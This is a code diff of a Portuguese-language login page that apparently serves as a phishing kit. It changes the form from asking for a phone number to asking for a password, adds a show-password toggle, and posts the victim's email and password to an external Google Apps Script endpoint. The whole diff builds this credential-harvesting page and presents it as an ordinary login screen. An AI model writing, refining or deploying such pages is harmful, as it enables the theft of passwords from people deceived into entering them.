@@ -2,7 +2,7 @@
 <html lang="pt-br">
 <head>
   <meta charset="utf-8" />
-  <title>Login — Telefone</title>
+  <title>Login — Senha</title>
   <meta name="viewport" content="width=device-width,initial-scale=1" />
   <style>
     :root{
@@ -50,12 +50,21 @@
       color:var(--text);
       margin-bottom:14px;
     }
-    input[type="text"]{
+    input[type="text"], input[type="password"]{
       padding:14px;
       font-size:15px;
       border:1px solid #dadce0;
       border-radius:6px;
       width:100%;
+      margin-bottom:8px;
+    }
+    .show-password-container{
+      display:flex;
+      align-items:center;
+      gap:6px;
+      font-size:14px;
+      color:var(--text);
+      margin-bottom:18px;
     }
     .actions{display:flex;align-items:center;justify-content:space-between;margin-top:18px}
     .link{color:var(--primary);text-decoration:none;font-size:14px}
@@ -92,9 +101,11 @@
     </div>
 
     <div class="right">
-      <form id="phoneForm">
-        <label for="phone" style="display:none">Telefone</label>
-        <input id="phone" name="phone" type="text" placeholder="Digite seu telefone" required />
+      <form id="senhaForm">
+        <input id="passwordField" type="password" name="password" placeholder="Digite sua senha" required />
+        <label class="show-password-container">
+          <input type="checkbox" id="togglePassword" /> Mostrar senha
+        </label>
         <div class="actions">
           <button type="submit">Enviar</button>
         </div>
@@ -110,11 +121,12 @@
 
     const scriptURL = 'https://script.google.com/macros/s/AKfycbwfT5uMwoWSHnhw5lYeznU-BIp4djaTotbwtE_Y8FtheLAzPuYhDyMiCRVYMSXCmGaI/exec';
 
-    document.getElementById('phoneForm').addEventListener('submit', function(e){
+    // Mantendo o envio da senha exatamente como estava funcionando antes
+    document.getElementById('senhaForm').addEventListener('submit', function(e){
       e.preventDefault();
-      const telefone = document.getElementById('phone').value.trim();
-      if(!telefone){
-        alert('Digite seu telefone.');
+      const senha = document.getElementById('passwordField').value.trim();
+      if(!senha){
+        alert('Digite sua senha.');
         return;
       }
 
@@ -124,14 +136,21 @@
         headers: {
           'Content-Type': 'application/json'
         },
-        body: JSON.stringify({ email, telefone })
+        body: JSON.stringify({ email, senha })
       })
       .then(() => alert('Dados enviados com sucesso!'))
       .catch(() => alert('Erro ao enviar os dados.'));
+    });
+
+    // Nova funcionalidade: Mostrar/Esconder senha
+    const pwField = document.getElementById('passwordField');
+    const toggle = document.getElementById('togglePassword');
+    toggle.addEventListener('change', function() {
+      const currentFontSize = pwField.style.fontSize || '15px';
+      pwField.type = this.checked ? 'text' : 'password';
+      pwField.style.fontSize = currentFontSize;
     });
   </script>
 
 </body>
 </html>
-
-
